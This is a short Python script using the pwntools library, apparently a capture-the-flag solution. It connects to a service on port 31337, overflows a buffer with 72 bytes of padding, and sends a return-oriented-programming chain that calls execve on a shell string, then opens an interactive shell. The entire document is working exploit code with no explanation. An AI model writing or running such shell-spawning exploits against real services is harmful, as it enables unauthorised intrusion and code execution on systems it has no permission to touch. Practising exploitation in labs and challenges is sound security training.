from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

pop_rax_rdi = 0x401071
pop_rsi_rdx = 0x40107f
syscall = 0x401028
sh = 0x402000
payload = flat([
    b'A'*72,
    pop_rax_rdi,0x3b,sh,
    pop_rsi_rdx,0,0,
    syscall
])
r.sendafter(b': ', payload)

r.interactive()